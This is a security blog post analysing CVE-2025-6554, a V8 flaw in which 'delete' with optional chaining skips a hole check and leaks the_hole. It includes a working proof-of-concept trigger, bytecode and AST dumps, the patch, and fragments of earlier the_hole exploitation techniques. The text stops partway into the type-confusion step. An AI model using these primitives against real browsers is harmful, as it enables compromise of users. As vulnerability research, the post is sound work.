<html>

<head>
  <title>retr0.zip</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../../style/main.css">
  <link rel="stylesheet" href="../../style/post.css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

  <script>
    hljs.highlightAll();
    window.onload = () => {
      const dateDocument = document.querySelector('blockquote > p');
      const dateString = new Date(dateDocument.innerText).toLocaleDateString(navigator.language, { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })
      dateDocument.innerText = dateString;
    }
  </script>
</head>

<body>
  <div class="center-container"><h1 id="cve-2025-6554-the-rabbit-hole">CVE-2025-6554: The (rabbit)
Hole</h1>
<blockquote>
<p>2025-10-07</p>
</blockquote>
<p>In June 2025, Google’s TAG (Clement Lecigne, <a
href="https://x.com/@_clem1">@_clem1</a>) discovered an in-the-wild
exploit that took advantage of a very famous primitive in V8 and
attracted a lot of attention, another <code>the_hole</code> leak with a
new exploitation technique. The bug itself is very interesting and
touches on various areas and concepts within V8. This post will just be
an analysis of this bug, but all credit goes to <a
href="https://x.com/@mistymntncop"><span class="citation"
data-cites="mistymntncop">@mistymntncop</span></a> and their <a
href="https://github.com/mistymntncop/CVE-2025-6554">writeup</a>, who
performed the analysis and wrote the PoCs that I am using here as the
main reference.</p>
<h2 id="previous-the_hole-exploitation-techniques">Previous
<code>the_hole</code> Exploitation Techniques</h2>
<p>The <code>the_hole</code> object has been a recurring exploitation
primitive in V8, with attackers discovering multiple ways to leak it
into JavaScript and leverage it for memory corruption. Before
CVE-2025-6554, there were at least two notable in-the-wild exploits
using <code>the_hole</code>:</p>
<h3 id="cve-2022-1364-escape-analysis-bypass">CVE-2022-1364: Escape
Analysis Bypass</h3>
<p><a
href="https://www.numencyber.com/from-leaking-thehole-to-chrome-renderer-rce-2/">This
technique</a> exploited an omission in V8’s escape analysis
implementation. The vulnerability stemmed from the non-standard
<code>getThis</code> API not being properly tracked during node escape
analysis, allowing <code>the_hole</code> to leak into JavaScript.</p>
<p>Once leaked, we can manipulated Map objects by exploiting
<code>the_hole</code>’s memory layout:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">getmap</span>(m) {</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    m <span class="op">=</span> <span class="kw">new</span> <span class="bu">Map</span>()<span class="op">;</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    m<span class="op">.</span><span class="fu">set</span>(<span class="dv">1</span><span class="op">,</span> <span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    m<span class="op">.</span><span class="fu">set</span>(<span class="op">%</span><span class="fu">TheHole</span>()<span class="op">,</span> <span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    m<span class="op">.</span><span class="fu">delete</span>(<span class="op">%</span><span class="fu">TheHole</span>())<span class="op">;</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    m<span class="op">.</span><span class="fu">delete</span>(<span class="op">%</span><span class="fu">TheHole</span>())<span class="op">;</span></span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    m<span class="op">.</span><span class="fu">delete</span>(<span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> m<span class="op">;</span></span></code></pre></div>
<h3 id="cve-2023-2033-turbofan-typer-confusion">CVE-2023-2033: Turbofan
Typer Confusion</h3>
<p><a
href="https://github.com/mistymntncop/CVE-2023-2033/blob/main/exploit.js"><span
class="citation" data-cites="mistymntncop">@mistymntncop</span>’s
CVE-2023-2033 exploit</a> discovered a weakness in Turbofan’s Typer
where <code>the_hole</code> was accidentally treated like other Oddball
objects, allowing operations like <code>ToNumber</code> that could
result in NaN. This accidental behavior enabled type confusion in the
JIT compiler:</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">weak_fake_obj</span>(b<span class="op">,</span> addr<span class="op">=</span><span class="fl">1.1</span>) {</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(b) {</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> index <span class="op">=</span> <span class="bu">Number</span>(b <span class="op">?</span> the<span class="op">.</span><span class="at">hole</span> <span class="op">:</span> <span class="op">-</span><span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>        index <span class="op">|=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>        index <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span></code></pre></div>
<h3 id="cve-2025-6554">CVE-2025-6554</h3>
<p>CVE-2025-6554 represents a different attack vector. Unlike the
previous exploits that targeted escape analysis or Typer behavior, this
vulnerability exploits a scope lifetime management bug in Ignition’s
bytecode generator, specifically around TDZ hole check elision
optimization. The post-leak exploitation technique is also novel, using
TypeGuard elimination in TurboFan’s LoadElimination phase to bypass type
checks and create an array with an invalid length.</p>
<h2 id="the-root-cause">The Root Cause</h2>
<p>The vulnerability originated from a <strong>scope lifetime management
bug</strong> in V8’s Ignition bytecode generator, specifically in how it
tracked TDZ hole check elision optimizations across optional chaining
control flow boundaries.</p>
<h3 id="v8s-temporal-dead-zone-tdz">V8’s Temporal Dead Zone (TDZ)</h3>
<p>JavaScript’s <code>let</code> and <code>const</code> declarations
create a Temporal Dead Zone where variables exist in scope but cannot be
accessed before their declaration:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(x)<span class="op">;</span> <span class="co">// ReferenceError: Cannot access &#39;x&#39; before initialization</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> x <span class="op">=</span> <span class="dv">5</span><span class="op">;</span></span></code></pre></div>
<p>V8 internally marks uninitialized variables with a special sentinel
value called <code>the_hole</code>. Before each access to a TDZ
variable, V8 emits a <code>ThrowReferenceErrorIfHole</code> bytecode
instruction. In June 2023, V8 enabled an optimization to eliminate
redundant TDZ checks within the same basic block using a bitmap tracking
mechanism (<a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.h;l=649-651;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>BytecodeGenerator::hole_check_bitmap_</code></a>).</p>
<h2 id="the-issue">The issue</h2>
<p>The bug occurred when optional chaining’s <a
href="https://en.wikipedia.org/wiki/Short-circuit_evaluation">short-circuit</a>
behavior interacted with TDZ hole check elision. The
<code>HoleCheckElisionScope</code> class managed bitmap state using <a
href="https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization">RAII
(Resource Acquisition Is Initialization)</a>, saving bitmap state on
construction and restoring it on destruction.</p>
<p>But the scope was in the wrong place:</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> BytecodeGenerator<span class="op">::</span>BuildOptionalChain<span class="op">(</span>ExpressionFunc expression_func<span class="op">)</span> <span class="op">{</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  BytecodeLabel done<span class="op">;</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  OptionalChainNullLabelScope label_scope<span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  HoleCheckElisionScope elider<span class="op">(</span><span class="kw">this</span><span class="op">);</span> <span class="co">// &lt;- the patch removed this</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>  expression_func<span class="op">();</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>  builder<span class="op">()-&gt;</span>Jump<span class="op">(&amp;</span>done<span class="op">);</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>  label_scope<span class="op">.</span>labels<span class="op">()-&gt;</span>Bind<span class="op">(</span>builder<span class="op">());</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>  builder<span class="op">()-&gt;</span>LoadUndefined<span class="op">();</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>  builder<span class="op">()-&gt;</span>Bind<span class="op">(&amp;</span>done<span class="op">);</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>When optional chaining evaluates to <code>null</code> or
<code>undefined</code>, it short-circuits via
<code>JumpIfUndefinedOrNull</code>. The right-hand side never executes
at runtime. But during bytecode generation, the generator still walks
through the entire AST, including code that will never run. If that dead
code accesses a TDZ variable, the bitmap gets marked as “checked”, even
though the check never actually happens at runtime.</p>
<h2 id="poc">PoC</h2>
<p>Minimal trigger:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">leak_hole</span>() {</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> x<span class="op">;</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">delete</span> x<span class="op">?.</span>[y]<span class="op">?.</span><span class="at">a</span><span class="op">;</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> y<span class="op">;</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> y<span class="op">;</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
<p>The <code>delete</code> operator is necessary for this bug, but not
to generate <code>the_hole</code> (as I thought when I first saw this
PoC). First, let’s look at the different code paths that optional
chaining can take depending on the context:</p>
<p><strong>Path 1: Regular optional chain</strong>
(<code>x?.[y]?.a</code>)</p>
<ul>
<li>Goes through <code>BuildOptionalChain</code></li>
<li>Has <code>HoleCheckElisionScope</code> as a <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=6488;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09">local
variable</a></li>
<li>Bitmap state is properly isolated</li>
<li>The return statement’s hole check is emitted correctly</li>
</ul>
<p><strong>Path 2: Delete with optional chain</strong>
(<code>delete x?.[y]?.a</code>)</p>
<ul>
<li>Goes through <code>VisitDelete</code> -&gt; creates <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=7105;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>OptionalChainNullLabelScope</code></a></li>
<li>Has <strong>no</strong> <code>HoleCheckElisionScope</code> at
all</li>
<li>Bitmap modifications leak outside the scope</li>
<li>The return statement’s hole check is omitted, causing the leak</li>
</ul>
<p>Here’s the asymmetry in the unpatched code:</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Path 1: BuildOptionalChain</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> BytecodeGenerator<span class="op">::</span>BuildOptionalChain<span class="op">(</span>ExpressionFunc expression_func<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>  BytecodeLabel done<span class="op">;</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>  OptionalChainNullLabelScope label_scope<span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>  HoleCheckElisionScope elider<span class="op">(</span><span class="kw">this</span><span class="op">);</span>  <span class="co">// &lt;- Has scope as local variable</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>  expression_func<span class="op">();</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>  builder<span class="op">()-&gt;</span>Jump<span class="op">(&amp;</span>done<span class="op">);</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>  label_scope<span class="op">.</span>labels<span class="op">()-&gt;</span>Bind<span class="op">(</span>builder<span class="op">());</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>  builder<span class="op">()-&gt;</span>LoadUndefined<span class="op">();</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>  builder<span class="op">()-&gt;</span>Bind<span class="op">(&amp;</span>done<span class="op">);</span></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">// Path 2: VisitDelete</span></span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> BytecodeGenerator<span class="op">::</span>VisitDelete<span class="op">(</span>UnaryOperation<span class="op">*</span> unary<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ...</span></span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>expr<span class="op">-&gt;</span>IsOptionalChain<span class="op">())</span> <span class="op">{</span></span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>    Expression<span class="op">*</span> expr_inner <span class="op">=</span> expr<span class="op">-&gt;</span>AsOptionalChain<span class="op">()-&gt;</span>expression<span class="op">();</span></span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>expr_inner<span class="op">-&gt;</span>IsProperty<span class="op">())</span> <span class="op">{</span></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>      Property<span class="op">*</span> property <span class="op">=</span> expr_inner<span class="op">-&gt;</span>AsProperty<span class="op">();</span></span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>      BytecodeLabel done<span class="op">;</span></span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>      OptionalChainNullLabelScope label_scope<span class="op">(</span><span class="kw">this</span><span class="op">);</span>  <span class="co">// &lt;- no HoleCheckElisionScope</span></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>      VisitForAccumulatorValue<span class="op">(</span>property<span class="op">-&gt;</span>obj<span class="op">());</span></span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>      <span class="co">// ...</span></span></code></pre></div>
<p>We can verify this with bytecode comparison. Without
<code>delete</code> (<code>x?.[y]?.a</code>):</p>
<pre><code>26 Ldar r1                                ; Load y for return
28 ThrowReferenceErrorIfHole [0]          ; check is present
30 Return                                 ; Return y</code></pre>
<p>With <code>delete</code> (<code>delete x?.[y]?.a</code>):</p>
<pre><code>26 Ldar r1                                ; Load y for return
28 Return                                 ; check is missing and the_hole leaks!</code></pre>
<p>The fix embeds <code>HoleCheckElisionScope</code> as a
<strong>member</strong> of <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=1220-1225;drc=22e9d9621de58ec6fe6581b56215059a48451b9f"><code>OptionalChainNullLabelScope</code></a>,
making both paths work correctly:</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> OptionalChainNullLabelScope <span class="op">{</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a> <span class="kw">public</span><span class="op">:</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">explicit</span> OptionalChainNullLabelScope<span class="op">(</span>BytecodeGenerator<span class="op">*</span> bytecode_generator<span class="op">)</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>      <span class="op">:</span> <span class="va">bytecode_generator_</span><span class="op">(</span>bytecode_generator<span class="op">),</span></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>        <span class="va">labels_</span><span class="op">(</span>bytecode_generator<span class="op">-&gt;</span>zone<span class="op">()),</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>        <span class="va">hole_check_scope_</span><span class="op">(</span>bytecode_generator<span class="op">)</span> <span class="op">{</span>  <span class="co">// &lt;- now a member</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">...</span></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a> <span class="kw">private</span><span class="op">:</span></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>  HoleCheckElisionScope <span class="va">hole_check_scope_</span><span class="op">;</span>  <span class="co">// &lt;- tied to scope lifetime</span></span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
<p>Now <strong>any</strong> code creating
<code>OptionalChainNullLabelScope</code> (both
<code>BuildOptionalChain</code> and <code>VisitDelete</code>)
automatically gets the proper bitmap isolation.</p>
<hr />
<p>Continuing to understand how V8 processes and reach the bug
conditions, here’s the AST for the vulnerable expression:</p>
<pre><code>// ./out/x64.debug/d8 --allow-natives-syntax --print-ast /tmp/poc.js
[generating bytecode for function: leak_hole]
...
EXPRESSION STATEMENT
└── kDelete
    └── OPTIONAL_CHAIN
        └── PROPERTY (x?.[y]?.a)              &lt;- Outer property
            ├── PROPERTY (x?.[y])             &lt;- Inner property (this is property-&gt;obj())
            │   ├── VAR PROXY &quot;x&quot;             &lt;- Object
            │   └── KEY
            │       └── VAR PROXY &quot;y&quot;         &lt;- Key (TDZ variable!)
            └── NAME &quot;a&quot;                       &lt;- Outer property name</code></pre>
<p>When <code>VisitDelete</code> processes this:</p>
<ol type="1">
<li>It extracts the outer property <code>x?.[y]?.a</code></li>
<li>Calls <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/bytecode-generator.cc;l=7106;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>VisitForAccumulatorValue(property-&gt;obj())</code></a>
where <code>obj = x?.[y]</code></li>
<li>To evaluate <code>x?.[y]</code>, V8 must load <code>y</code> (the
TDZ variable)</li>
<li>This triggers a hole check and marks the bitmap</li>
<li><strong>But no <code>HoleCheckElisionScope</code> wraps step
2!</strong></li>
</ol>
<p>We can also take a look at the bytecode, here is the bytecode that V8
generates for <code>leak_hole()</code>:</p>
<pre><code>// ./out/x64.debug/d8 --allow-natives-syntax --print-bytecode /tmp/poc.js
 0 LdaTheHole                             ; Load the_hole -&gt; accumulator
 1 Star1                                  ; y = the_hole
 2 LdaUndefined                           ; Load undefined -&gt; accumulator
 3 Star0                                  ; x = undefined
 4 Mov r0, r2                             ; Copy x to r2
 7 JumpIfUndefinedOrNull [18] (-&gt;25)      ; If x is null/undefined, jump to 25
                                          ; (short-circuit happens here)
 9 Ldar r1                                ; Load y -&gt; accumulator
11 ThrowReferenceErrorIfHole [0]          ; Check if y is the_hole (skipped)
13 GetKeyedProperty r2, [0]               ; x[y]
16 JumpIfUndefinedOrNull [9] (-&gt;25)       ; If x[y] is null/undefined, jump
18 Star2                                  ; Store result
19 LdaConstant [1]                        ; Load &#39;a&#39;
21 DeletePropertySloppy r2                ; Delete property
23 Jump [3] (-&gt;26)
25 LdaTrue                                ; Load true (from short-circuit)
26 Ldar r1                                ; Load y for return
28 Return                                 ; Return y (no hole check!)</code></pre>
<p>Key observations:</p>
<ul>
<li><strong>Offset 7</strong>: Short-circuit jumps to offset 25,
skipping offset 11</li>
<li><strong>Offset 11</strong>: <code>ThrowReferenceErrorIfHole</code>
is present but never executes</li>
<li><strong>Offset 28</strong>: Missing
<code>ThrowReferenceErrorIfHole</code> in unpatched version</li>
<li>The bitmap was marked at compile-time (during offset 11
generation)</li>
<li>At offset 26, the generator thinks <code>y</code> was already
checked, skips the second check</li>
</ul>
<p>In the patched version, a <code>ThrowReferenceErrorIfHole</code>
instruction is added after offset 26:</p>
<pre><code>26 Ldar r1                                ; Load y for return
28 ThrowReferenceErrorIfHole [0]          ; check added by patch
30 Return                                 ; Return y</code></pre>
<p>Now that we’ve seen the bytecode, let’s trace the complete corruption
sequence:</p>
<pre><code>Compile-time (during bytecode generation):
1. VisitDelete processes: delete x?.[y]?.a
2. Creates OptionalChainNullLabelScope
3. Calls VisitForAccumulatorValue(property-&gt;obj()) where obj = x?.[y]
   - To evaluate x?.[y], needs to load y as the key (bytecode offset 9)
   - Loading y triggers BuildThrowIfHole
   - Emits ThrowReferenceErrorIfHole at offset 11, marks bitmap
   - But NO HoleCheckElisionScope wraps this evaluation
4. Bitmap modification leaks outside the optional chain scope
5. Later, generating return statement bytecode (offset 26-28)
6. Sees bitmap bit set, assumes &#39;y&#39; was already checked
7. Skips emitting ThrowReferenceErrorIfHole for the return (offset 28 missing)

Runtime:
1. Execute bytecode offset 0-4: Initialize x=undefined, y=the_hole
2. Offset 7: JumpIfUndefinedOrNull -&gt; short-circuit to offset 25
3. Offset 11: ThrowReferenceErrorIfHole never executes (jumped over)
4. Offset 25-26: Load y (still contains the_hole)
5. Offset 28: Missing ThrowReferenceErrorIfHole in unpatched version
6. the_hole leaks into JavaScript</code></pre>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat /tmp/poc.js</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> leak_hole()</span> <span class="kw">{</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">let</span> <span class="va">x</span><span class="kw">;</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">delete</span> x<span class="pp">?</span>.<span class="pp">[</span><span class="ss">y</span><span class="pp">]?</span>.a<span class="kw">;</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="ex">y</span><span class="kw">;</span></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>  <span class="bu">let</span> <span class="va">y</span><span class="kw">;</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="ex">print</span><span class="er">(</span><span class="fu">leak_hole()</span><span class="kw">);</span></span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./out/x64.debug/d8 /tmp/poc.js</span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Fatal error in ../../src/api/api.cc, line 807</span></span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Debug check failed: !IsTheHole(heap_object).</span></span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span>
<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span>
<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span>
<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="co">#FailureMessage Object: 0x7ffc705cee28</span></span>
<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a><span class="ex">====</span> C stack trace ===============================</span>
<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
<h2 id="from-hole-to-exploit">From Hole to Exploit</h2>
<p>The leaked <code>the_hole</code> object enables a sophisticated and
very interesting type confusion attack in TurboFan’s compiler. This
technique was <a
href="https://github.com/mistymntncop/CVE-2025-6554">documented by <span
class="citation" data-cites="mistymntncop">@mistymntncop</span></a>,
based on the in-the-wild <a
href="https://issues.chromium.org/issues/427663123#comment5">exploit</a>,
so all the credits for this guys :D.</p>
<h3 id="step-1-type-confusion-via-the_hole.length">Step 1: Type
Confusion via <code>the_hole.length</code></h3>
<p>The <code>the_hole</code> object has an unusual property: at offset
+8 (where strings store their length), it contains the value
<code>0xfff7ffff</code> (-524289). This creates a type confusion
opportunity:</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat /tmp/a.js</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">%DebugPrint</span><span class="er">(</span><span class="st">&quot;some string&quot;</span><span class="kw">);</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="ex">%DebugPrint</span><span class="er">(</span><span class="fu">%TheHole()</span><span class="kw">);</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="fu">%SystemBreak()</span><span class="kw">;</span></span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> gdb-pwndbg <span class="at">--args</span> ./out/x64.release/d8 <span class="at">--allow-natives-syntax</span> /tmp/a.js</span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="ex">DebugPrint:</span> 0x11000005d421: <span class="pp">[</span><span class="ss">String</span><span class="pp">]</span> in OldSpace: <span class="co">#some string</span></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x110000000155:</span> <span class="pp">[</span><span class="ss">Map</span><span class="pp">]</span> in ReadOnlySpace</span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> map: 0x110000000475 <span class="op">&lt;</span>MetaMap <span class="er">(</span><span class="ex">0x11000000002d</span> <span class="op">&lt;</span>null<span class="op">&gt;</span><span class="kw">)</span><span class="op">&gt;</span></span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> type: INTERNALIZED_ONE_BYTE_STRING_TYPE</span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> instance size: variable</span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> elements kind: HOLEY_ELEMENTS</span>
<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> enum length: invalid</span>
<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> non-extensible</span>
<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> back pointer: 0x110000000011 <span class="op">&lt;</span>undefined<span class="op">&gt;</span></span>
<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> prototype_validity_cell: 0</span>
